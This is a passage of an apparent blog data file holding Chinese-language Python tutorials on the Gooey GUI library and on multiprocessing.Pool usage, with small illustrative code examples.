Arguments参数，代码中’test’对应前者，’-test’对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。</p>\n<p>image目录下图片文件名，分别用来覆盖界面上的图片：</p>\n<ul>\n<li>program_icon.ico  　　ico图标</li>\n<li>success_icon.png  　　运行成功的图标</li>\n<li>running_icon.png  　　正在运行时的图标</li>\n<li>loading_icon.gif  　　加载时的图标</li>\n<li>config_icon.png   　　配置图片</li>\n<li>error_icon.png    　　出错时的图片</li>\n</ul>\n<p>action内容表示参数类型，分别对应着wxpython相应的控件：</p>\n<ul>\n<li>store 　　TextCtrl</li>\n<li>store_const 　　CheckBox</li>\n<li>store_true  　　CheckBox</li>\n<li>store_False 　　CheckBox</li>\n<li>append      　　TextCtrl</li>\n<li>count       　　DropDown</li>\n<li>Mutually Exclusive Group  　　RadioGroup</li>\n<li>chooice     　　DropDown</li>\n</ul>\n<p>除了action之外，Gooey还提供了一些小工具（Widgets）</p>\n<ul>\n<li>DirChooser   　　目录选择按钮工具</li>\n<li>FileChooser  　　文件选择按钮工具</li>\n<li>DateChooser  　　时间选择按钮工具</li>\n</ul>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><p>　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。</p>\n<p>参考文档：<br>GitHub地址:<a href=\"https://github.com/chriskiehl/Gooey\" target=\"_blank\" rel=\"external\">https://github.com/chriskiehl/Gooey</a><br>官方例子：<a href=\"https://github.com/chriskiehl/GooeyExamples/tree/master/examples\" target=\"_blank\" rel=\"external\">https://github.com/chriskiehl/GooeyExamples/tree/master/examples</a><br>官方文档：<a href=\"https://github.com/chriskiehl/Gooey#how-does-it-work\" target=\"_blank\" rel=\"external\">https://github.com/chriskiehl/Gooey#how-does-it-work</a></p>\n","excerpt":"","more":"<p>　　Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数—GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。</p>\n<h3 id=\"安装Gooey\"><a href=\"#安装Gooey\" class=\"headerlink\" title=\"安装Gooey\"></a>安装Gooey</h3><p>最简单的安装方法：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install Gooey</div></pre></td></tr></table></figure></p>\n<p>或者：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/chriskiehl/Gooey.git</div></pre></td></tr></table></figure></p>\n<p>然后运行setup.py :<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python setup.py install</div></pre></td></tr></table></figure></p>\n<p>相关依赖：<br>wxpython<br>安装：pip install wxpython (windows下需要去官网下载安装包)</p>\n<h3 id=\"使用Gooey转化argparse\"><a href=\"#使用Gooey转化argparse\" class=\"headerlink\" title=\"使用Gooey转化argparse\"></a>使用Gooey转化argparse</h3><p>最简单的例子，将argparse参数转化为GUI控件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#! -*- coding:utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\">from gooey import Gooey</div><div class=\"line\">import argparse</div><div class=\"line\"></div><div class=\"line\">@Gooey()</div><div class=\"line\">def main():</div><div class=\"line\">\tparser = argparse.ArgumentParser()</div><div class=\"line\">\tparser.add_argument(<span class=\"string\">\"test\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"this is a test\"</span> )</div><div class=\"line\">\targs=parser.parse_args()</div><div class=\"line\">\t<span class=\"built_in\">print</span> args</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tmain()</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170215/1.png\" alt=\"\"></p>\n<p>说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。</p>\n<p>参数：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\">@Gooey(advanced=Boolean,          <span class=\"comment\"># toggle whether to show advanced config or not </span></div><div class=\"line\">       language=language_string,  <span class=\"comment\"># Translations configurable via json</span></div><div class=\"line\">       show_config=True,          <span class=\"comment\"># skip config screens all together</span></div><div class=\"line\">       program_name=<span class=\"string\">'name'</span>,       <span class=\"comment\"># Defaults to script name</span></div><div class=\"line\">       program_description,       <span class=\"comment\"># Defaults to ArgParse Description</span></div><div class=\"line\">       default_size=(610, 530),   <span class=\"comment\"># starting size of the GUI</span></div><div class=\"line\">       required_cols=1,           <span class=\"comment\"># number of columns in the \"Required\" section</span></div><div class=\"line\">       optional_cols=2,           <span class=\"comment\"># number of columbs in the \"Optional\" section</span></div><div class=\"line\">       dump_build_config=False,   <span class=\"comment\"># Dump the JSON Gooey uses to configure itself</span></div><div class=\"line\">       load_build_config=None,    <span class=\"comment\"># Loads a JSON Gooey-generated configuration</span></div><div class=\"line\">       monospace_display=False)   <span class=\"comment\"># Uses a mono-spaced font in the output screen</span></div><div class=\"line\">       image_dir                  <span class=\"comment\"># Path to the diretory in which Gooey should look for custom inmages</span></div><div class=\"line\">       language_dir               <span class=\"comment\"># Path to the diretory in which Gooey should look for custom languages</span></div><div class=\"line\">)</div></pre></td></tr></table></figure></p>\n<p>参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">@Gooey(program_name=u<span class=\"string\">'这是一个测试脚本'</span>,default_size=(500,500))</div><div class=\"line\">def main():</div><div class=\"line\">\tparser = argparse.ArgumentParser(description=u<span class=\"string\">\"测试描述内容\"</span>)</div><div class=\"line\">\tparser.add_argument(<span class=\"string\">\"test\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"this is a test\"</span> )</div><div class=\"line\">\targs=parser.parse_args()</div><div class=\"line\">\t<span class=\"built_in\">print</span> args</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tmain()</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170215/2.png\" alt=\"\"></p>\n<h3 id=\"使用GooeyParse\"><a href=\"#使用GooeyParse\" class=\"headerlink\" title=\"使用GooeyParse\"></a>使用GooeyParse</h3><p>简单例子：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\">from gooey import Gooey, GooeyParser</div><div class=\"line\"></div><div class=\"line\">@Gooey(program_name=<span class=\"string\">\"test\"</span>,image_dir=<span class=\"string\">\".\\image\"</span>) <span class=\"comment\">##注意斜杠</span></div><div class=\"line\">def main():</div><div class=\"line\">    parser=GooeyParser(description=u<span class=\"string\">\"测试\"</span>)</div><div class=\"line\">    <span class=\"comment\">##文本输入框</span></div><div class=\"line\">    parser.add_argument(<span class=\"string\">\"test\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"this is a test\"</span>)</div><div class=\"line\">    <span class=\"comment\">##选择框</span></div><div class=\"line\">    parser.add_argument(</div><div class=\"line\">     <span class=\"string\">\"test2\"</span>,</div><div class=\"line\">     metavar=<span class=\"string\">'Should I exlode?'</span>,   <span class=\"comment\">##描述内容</span></div><div class=\"line\">     <span class=\"built_in\">help</span>=<span class=\"string\">\"this is test2\"</span>,         <span class=\"comment\">##帮助内容</span></div><div class=\"line\">     choices=[<span class=\"string\">\"Yes\"</span>,<span class=\"string\">\"No\"</span>],         <span class=\"comment\">##选择框</span></div><div class=\"line\">     default=<span class=\"string\">\"Yes\"</span>                 <span class=\"comment\">##默认值</span></div><div class=\"line\">     )</div><div class=\"line\">    <span class=\"comment\">##复选框</span></div><div class=\"line\">    parser.add_argument(</div><div class=\"line\">       <span class=\"string\">'-f'</span>,<span class=\"string\">'--foo'</span>,</div><div class=\"line\">       metavar=<span class=\"string\">\"some flag\"</span>,</div><div class=\"line\">       action=<span class=\"string\">\"store_true\"</span>,        <span class=\"comment\">##参数类型</span></div><div class=\"line\">       <span class=\"built_in\">help</span>=<span class=\"string\">\"\"</span>)</div><div class=\"line\">    <span class=\"comment\">##文本选择按钮</span></div><div class=\"line\">    parser.add_argument(<span class=\"string\">'filename'</span>, metavar=u<span class=\"string\">\"文件选择\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"name of the file to process\"</span>, widget=<span class=\"string\">'FileChooser'</span>) <span class=\"comment\">#文本选择按钮</span></div><div class=\"line\">    parser.add_argument(<span class=\"string\">'datetime'</span>, metavar=u<span class=\"string\">\"时间选择\"</span>,<span class=\"built_in\">help</span>=<span class=\"string\">\"date to process\"</span>,widget=<span class=\"string\">'DateChooser'</span>,default=<span class=\"string\">\"2017-02-15\"</span>) <span class=\"comment\">#时间选择按钮</span></div><div class=\"line\">    args=parser.parse_args()</div><div class=\"line\">    <span class=\"built_in\">print</span> args</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">     main()</div></pre></td></tr></table></figure></p>\n<p>运行截图：<br><img src=\"/upload_image/20170215/3.png\" alt=\"\"><br>说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中’test’对应前者，’-test’对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。</p>\n<p>image目录下图片文件名，分别用来覆盖界面上的图片：</p>\n<ul>\n<li>program_icon.ico  　　ico图标</li>\n<li>success_icon.png  　　运行成功的图标</li>\n<li>running_icon.png  　　正在运行时的图标</li>\n<li>loading_icon.gif  　　加载时的图标</li>\n<li>config_icon.png   　　配置图片</li>\n<li>error_icon.png    　　出错时的图片</li>\n</ul>\n<p>action内容表示参数类型，分别对应着wxpython相应的控件：</p>\n<ul>\n<li>store 　　TextCtrl</li>\n<li>store_const 　　CheckBox</li>\n<li>store_true  　　CheckBox</li>\n<li>store_False 　　CheckBox</li>\n<li>append      　　TextCtrl</li>\n<li>count       　　DropDown</li>\n<li>Mutually Exclusive Group  　　RadioGroup</li>\n<li>chooice     　　DropDown</li>\n</ul>\n<p>除了action之外，Gooey还提供了一些小工具（Widgets）</p>\n<ul>\n<li>DirChooser   　　目录选择按钮工具</li>\n<li>FileChooser  　　文件选择按钮工具</li>\n<li>DateChooser  　　时间选择按钮工具</li>\n</ul>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><p>　　说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。</p>\n<p>参考文档：<br>GitHub地址:<a href=\"https://github.com/chriskiehl/Gooey\">https://github.com/chriskiehl/Gooey</a><br>官方例子：<a href=\"https://github.com/chriskiehl/GooeyExamples/tree/master/examples\">https://github.com/chriskiehl/GooeyExamples/tree/master/examples</a><br>官方文档：<a href=\"https://github.com/chriskiehl/Gooey#how-does-it-work\">https://github.com/chriskiehl/Gooey#how-does-it-work</a></p>\n"},{"title":"Multiprocessing.Pool","date":"2016-11-24T01:44:56.000Z","comments":1,"_content":"\n　　Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。\n\n#### Pool介绍\n\n##### 用途\nPool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用[Process](http://thief.one/2016/11/24/Multiprocessing-Process)类。\n\n##### 构造方法\n* Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])\n* processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。\n* initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。\n* maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。\n* context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。\n\n##### 实例方法\n* apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。\n* apply(func[, args[, kwds]])是阻塞的。\n* close()    关闭pool，使其不在接受新的任务。\n* terminate()    关闭pool，结束工作进程，不在处理未完成的任务。\n* join()    主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。\n\n#### Pool使用方法\n\n##### Pool+map函数\n\n说明：此写法缺点在于只能通过map向函数传递一个参数。\n\n```bash\nfrom multiprocessing import Pool\n\ndef test(i):\n    print i\n\nif __name__==\"__main__\":\n\tlists=[1,2,3]\n\tpool=Pool(processes=2) #定义最大的进程数\n\tpool.map(test,lists)        #p必须是一个可迭代变量。\n\tpool.close()\n\tpool.join()\n```\n\n##### 异步进程池（非阻塞）\n\n```bash\nfrom multiprocessing import Pool\n\ndef test(i):\n    print i\n\nif __name__==\"__main__\":\n\tpool = Pool(processes=10)\n\tfor i  in xrange(500):\n\t\t'''\n\t\tFor循环中执行步骤：\n\t\t（1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）\n\t\t（2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）\n\t\t\n\t\tapply_async为异步进程池写法。\n\t\t异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。\n\t\t'''\n\t    pool.apply_async(test, args=(i,)) #维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       \n\n\tprint “test”\n\tpool.close()\n\tpool.join()\n```\n\n执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）\n\n注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。\n\n\n##### 同步进程池（阻塞）\n\n```bash\nfrom multiprocessing import Pool\n\ndef test(p):\n       print p\n       time.sleep(3)\n\nif __name__==\"__main__\":\n\tpool = Pool(processes=10)\n\tfor i  in xrange(500):\n\t'''\n\t实际测试发现，for循环内部执行步骤：\n\t（1）遍历500个可迭代对象，往进程池放一个子进程\n\t（2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）\n\tfor循环执行完毕，再执行print函数。\n\t'''\n\t    pool.apply(test, args=(i,))   #维持执行的进程总数为10，当一个进程执行完后启动一个新进程.\n\n\tprint “test”\n\tpool.close()\n\tpool.join()\n```\n\n说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程.....等500个子进程都执行完了，再执行print \"test\"。（从结果来看，并没有多进程并发）\n\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","source":"_posts/Multiprocessing-Pool.md","raw":"---\ntitle: Multiprocessing.Pool\ndate: 2016-11-24 09:44:56\ncomments: true\ntags: Multiprocessing\ncategories: 编程之道\n---\n\n　　Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。\n\n#### Pool介绍\n\n##### 用途\nPool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用[Process](http://thief.one/2016/11/24/Multiprocessing-Process)类。\n\n##### 构造方法\n* Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])\n* processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。\n* initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。\n* maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。\n* context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。\n\n##### 实例方法\n* apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。\n* apply(func[, args[, kwds]])是阻塞的。\n* close()    关闭pool，使其不在接受新的任务。\n* terminate()    关闭pool，结束工作进程，不在处理未完成的任务。\n* join()    主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。\n\n#### Pool使用方法\n\n##### Pool+map函数\n\n说明：此写法缺点在于只能通过map向函数传递一个参数。\n\n```bash\nfrom multiprocessing import Pool\n\ndef test(i):\n    print i\n\nif __name__==\"__main__\":\n\tlists=[1,2,3]\n\tpool=Pool(processes=2) #定义最大的进程数\n\tpool.map(test,lists)        #p必须是一个可迭代变量。\n\tpool.close()\n\tpool.join()\n```\n\n##### 异步进程池（非阻塞）\n\n```bash\nfrom multiprocessing import Pool\n\ndef test(i):\n    print i\n\nif __name__==\"__main__\":\n\tpool = Pool(processes=10)\n\tfor i  in xrange(500):\n\t\t'''\n\t\tFor循环中执行步骤：\n\t\t（1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）\n\t\t（2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）\n\t\t\n\t\tapply_async为异步进程池写法。\n\t\t异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。\n\t\t'''\n\t    pool.apply_async(test, args=(i,)) #维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       \n\n\tprint “test”\n\tpool.close()\n\tpool.join()\n```\n\n执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）\n\n注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。\n\n\n##### 同步进程池（阻塞）\n\n```bash\nfrom multiprocessing import Pool\n\ndef test(p):\n       print p\n       time.sleep(3)\n\nif __name__==\"__main__\":\n\tpool = Pool(processes=10)\n\tfor i  in xrange(500):\n\t'''\n\t实际测试发现，for循环内部执行步骤：\n\t（1）遍历500个可迭代对象，往进程池放一个子进程\n\t（2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）\n\tfor循环执行完毕，再执行print函数。\n\t'''\n\t    pool.apply(test, args=(i,))   #维持执行的进程总数为10，当一个进程执行完后启动一个新进程.\n\n\tprint “test”\n\tpool.close()\n\tpool.join()\n```\n\n说明：for循环内执行的步骤顺序，往进程池中添加一个子进程，执行子进程，等待执行完毕再添加一个子进程.....等500个子进程都执行完了，再执行print \"test\"。（从结果来看，并没有多进程并发）\n\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","slug":"Multiprocessing-Pool","published":1,"updated":"2017-02-14T01:12:03.335Z","layout":"post","photos":[],"link":"","_id":"ciz80dyak00063ofvm5mul5cq","content":"<p>　　Multiprocessing.Pool可以提供指定数量的进程供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来执行它。在共享资源时，只能使用Multiprocessing.Manager类，而不能使用Queue或者Array。</p>\n<h4 id=\"Pool介绍\"><a href=\"#Pool介绍\" class=\"headerlink\" title=\"Pool介绍\"></a>Pool介绍</h4><h5 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h5><p>Pool类用于需要执行的目标很多，而手动限制进程数量又太繁琐时，如果目标少且不用控制进程数量则可以用<a href=\"http://thief.one/2016/11/24/Multiprocessing-Process\">Process</a>类。</p>\n<h5 id=\"构造方法\"><a href=\"#构造方法\" class=\"headerlink\" title=\"构造方法\"></a>构造方法</h5><ul>\n<li>Pool([processes[, initializer[, initargs[, maxtasksperchild[, context]]]]])</li>\n<li>processes ：使用的工作进程的数量，如果processes是None那么使用 os.cpu_count()返回的数量。</li>\n<li>initializer： 如果initializer是None，那么每一个工作进程在开始的时候会调用initializer(*initargs)。</li>\n<li>maxtasksperchild：工作进程退出之前可以完成的任务数，完成后用一个新的工作进程来替代原进程，来让闲置的资源被释放。maxtasksperchild默认是None，意味着只要Pool存在工作进程就会一直存活。</li>\n<li>context: 用在制定工作进程启动时的上下文，一般使用 multiprocessing.Pool() 或者一个context对象的Pool()方法来创建一个池，两种方法都适当的设置了context。</li>\n</ul>\n<h5 id=\"实例方法\"><a href=\"#实例方法\" class=\"headerlink\" title=\"实例方法\"></a>实例方法</h5><ul>\n<li>apply_async(func[, args[, kwds[, callback]]]) 它是非阻塞。</li>\n<li>apply(func[, args[, kwds]])是阻塞的。</li>\n<li>close()    关闭pool，使其不在接受新的任务。</li>\n<li>terminate()    关闭pool，结束工作进程，不在处理未完成的任务。</li>\n<li>join()    主进程阻塞，等待子进程的退出， join方法要在close或terminate之后使用。</li>\n</ul>\n<h4 id=\"Pool使用方法\"><a href=\"#Pool使用方法\" class=\"headerlink\" title=\"Pool使用方法\"></a>Pool使用方法</h4><h5 id=\"Pool-map函数\"><a href=\"#Pool-map函数\" class=\"headerlink\" title=\"Pool+map函数\"></a>Pool+map函数</h5><p>说明：此写法缺点在于只能通过map向函数传递一个参数。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i):</div><div class=\"line\">    <span class=\"built_in\">print</span> i</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tlists=[1,2,3]</div><div class=\"line\">\tpool=Pool(processes=2) <span class=\"comment\">#定义最大的进程数</span></div><div class=\"line\">\tpool.map(<span class=\"built_in\">test</span>,lists)        <span class=\"comment\">#p必须是一个可迭代变量。</span></div><div class=\"line\">\tpool.close()</div><div class=\"line\">\tpool.join()</div></pre></td></tr></table></figure>\n<h5 id=\"异步进程池（非阻塞）\"><a href=\"#异步进程池（非阻塞）\" class=\"headerlink\" title=\"异步进程池（非阻塞）\"></a>异步进程池（非阻塞）</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(i):</div><div class=\"line\">    <span class=\"built_in\">print</span> i</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tpool = Pool(processes=10)</div><div class=\"line\">\t<span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(500):</div><div class=\"line\">\t\t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">\t\tFor循环中执行步骤：</div><div class=\"line\">\t\t（1）循环遍历，将500个子进程添加到进程池（相对父进程会阻塞）</div><div class=\"line\">\t\t（2）每次执行10个子进程，等一个子进程执行完后，立马启动新的子进程。（相对父进程不阻塞）</div><div class=\"line\">\t\t</div><div class=\"line\">\t\tapply_async为异步进程池写法。</div><div class=\"line\">\t\t异步指的是启动子进程的过程，与父进程本身的执行（print）是异步的，而For循环中往进程池添加子进程的过程，与父进程本身的执行却是同步的。</div><div class=\"line\">\t\t'<span class=\"string\">''</span></div><div class=\"line\">\t    pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)) <span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后启动一个新进程.       </span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">print</span> “<span class=\"built_in\">test</span>”</div><div class=\"line\">\tpool.close()</div><div class=\"line\">\tpool.join()</div></pre></td></tr></table></figure>\n<p>执行顺序：For循环内执行了2个步骤，第一步：将500个对象放入进程池（阻塞）。第二步：同时执行10个子进程（非阻塞），有结束的就立即添加，维持10个子进程运行。（apply_async方法的会在执行完for循环的添加步骤后，直接执行后面的print语句，而apply方法会等所有进程池中的子进程运行完以后再执行后面的print语句）</p>\n<p>注意：调用join之前，先调用close或者terminate方法，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束。</p>\n<h5 id=\"同步进程池（阻塞）\"><a href=\"#同步进程池（阻塞）\" class=\"headerlink\" title=\"同步进程池（阻塞）\"></a>同步进程池（阻塞）</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):</div><div class=\"line\">       <span class=\"built_in\">print</span> p</div><div class=\"line\">       time.sleep(3)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">\tpool = Pool(processes=10)</div><div class=\"line\">\t<span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(500):</div><div class=\"line\">\t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">\t实际测试发现，for循环内部执行步骤：</div><div class=\"line\">\t（1）遍历500个可迭代对象，往进程池放一个子进程</div><div class=\"line\">\t（2）执行这个子进程，等子进程执行完毕，再往进程池放一个子进程，再执行。（同时只执行一个子进程）</div><div class=\"line\">\tfor循环执行完毕，再执行print函数。</div><div class=\"line\">\t'<span 